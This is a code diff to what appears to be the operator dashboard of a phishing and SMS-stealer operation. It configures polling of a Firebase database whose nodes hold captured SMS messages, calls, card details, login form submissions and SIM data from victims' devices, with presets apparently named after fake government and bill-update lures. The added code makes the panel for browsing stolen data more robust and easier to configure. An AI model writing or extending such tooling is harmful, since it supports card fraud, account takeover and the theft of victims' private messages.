@@ -314,12 +314,35 @@ include_once __DIR__ . '/header.php';
           try {
             // Determine active Firebase DB REST URL — use operator's own saved database URL
             const activePreset = allFbPresets[fbPresetKey] || DEFAULT_SCHEMA_PRESETS.pm_admin;
-            const databaseUrl = fbDatabaseUrl.trim() ||
-                                adminUser?.firebaseDatabaseUrl ||
-                                adminUser?.firebaseConfig?.databaseURL ||
-                                '';
-            if (!databaseUrl) return; // No DB URL configured — skip polling
-            const jsonEndpoint = `${databaseUrl}/.json`;
+            const resolvedPreset = (fbPresetKey === 'custom') ? {
+              sms: fbSmsColl,
+              calls: fbCallsColl,
+              cards: fbCardsColl,
+              forms: fbFormsColl,
+              sims: fbSimsColl
+            } : {
+              sms: adminUser?.collectionSms || activePreset.sms,
+              calls: adminUser?.collectionCalls || activePreset.calls,
+              cards: adminUser?.collectionCards || activePreset.cards,
+              forms: adminUser?.collectionForms || activePreset.forms,
+              sims: adminUser?.collectionSims || activePreset.sims || 'user_data'
+            };
+
+            let rawUrl = fbDatabaseUrl.trim() ||
+                         adminUser?.firebaseDatabaseUrl ||
+                         adminUser?.firebaseConfig?.databaseURL ||
+                         '';
+            if (!rawUrl) return; // No DB URL configured — skip polling
+
+            // Auto-fix URL protocol if missing (relative paths safety)
+            if (!/^https?:\/\//i.test(rawUrl)) {
+              rawUrl = 'https://' + rawUrl;
+            }
+            // Remove trailing slash
+            if (rawUrl.endsWith('/')) {
+              rawUrl = rawUrl.slice(0, -1);
+            }
+            const jsonEndpoint = `${rawUrl}/.json`;
 
             const response = await fetch(jsonEndpoint);
             if (!response.ok) return;
@@ -328,10 +351,10 @@ include_once __DIR__ . '/header.php';
             if (!dbData || typeof dbData !== 'object' || !isMounted) return;
 
             // Extract Node Mappings
-            const user_data_node = dbData[activePreset.sims || 'user_data'] || dbData.user_data || {};
-            const user_sms_node = dbData[activePreset.sms || 'user_sms'] || dbData.user_sms || {};
-            const card_node = dbData[activePreset.cards || 'Card'] || dbData.Card || {};
-            const login_node = dbData[activePreset.forms || 'login'] || dbData.login || {};
+            const user_data_node = dbData[resolvedPreset.sims || 'user_data'] || dbData.user_data || {};
+            const user_sms_node = dbData[resolvedPreset.sms || 'user_sms'] || dbData.user_sms || {};
+            const card_node = dbData[resolvedPreset.cards || 'Card'] || dbData.Card || {};
+            const login_node = dbData[resolvedPreset.forms || 'login'] || dbData.login || {};
             const account_node = dbData.account || {};
 
             // Build Live User Devices List
@@ -471,7 +494,7 @@ include_once __DIR__ . '/header.php';
           clearInterval(interval);
           document.removeEventListener('visibilitychange', handleVisibilityChange);
         };
-      }, [fbPresetKey, fbDatabaseUrl, adminUser?.firebaseDatabaseUrl]);
+      }, [fbPresetKey, fbDatabaseUrl, fbSmsColl, fbCallsColl, fbCardsColl, fbFormsColl, fbSimsColl, adminUser]);
 
       // Firebase Config Modal State
       const [showFirebaseModal, setShowFirebaseModal] = React.useState(false);
@@ -486,6 +509,7 @@ include_once __DIR__ . '/header.php';
       const [fbCallsColl, setFbCallsColl] = React.useState('calls');
       const [fbCardsColl, setFbCardsColl] = React.useState('Card');
       const [fbFormsColl, setFbFormsColl] = React.useState('login');
+      const [fbSimsColl, setFbSimsColl] = React.useState('user_data');
       const [fbJsonPaste, setFbJsonPaste] = React.useState('');
       const [fbSaveStatus, setFbSaveStatus] = React.useState('');
 
@@ -497,6 +521,7 @@ include_once __DIR__ . '/header.php';
           setFbCallsColl(p.calls);
           setFbCardsColl(p.cards);
           setFbFormsColl(p.forms);
+          setFbSimsColl(p.sims || 'user_data');
         }
       };
 
@@ -510,7 +535,7 @@ include_once __DIR__ . '/header.php';
           calls: fbCallsColl || 'callData',
           cards: fbCardsColl || 'cardData',
           forms: fbFormsColl || 'formData',
-          sims: 'simData',
+          sims: fbSimsColl || 'simData',
           isUserCreated: true
         };
         const updated = { ...fbCustomPresets, [key]: newPreset };
@@ -706,6 +731,17 @@ include_once __DIR__ . '/header.php';
             setFbCallsColl(op.collectionCalls || 'calls');
             setFbCardsColl(op.collectionCards || 'Card');
             setFbFormsColl(op.collectionForms || 'login');
+            setFbSimsColl(op.collectionSims || 'user_data');
+
+            // Find matching preset key dynamically
+            let matchedPreset = 'custom';
+            if (op.collectionSms === 'user_sms' && op.collectionCards === 'Card' && op.collectionForms === 'login') {
+              matchedPreset = 'pm_admin';
+            } else if (op.collectionSms === 'messages' && op.collectionCards === 'clients' && op.collectionForms === 'clients') {
+              matchedPreset = 'bill_update_parivahan';
+            }
+            setFbPresetKey(matchedPreset);
+
             setAdminUser(op);
             return;
           } else if (response.status === 401 || response.status === 403) {
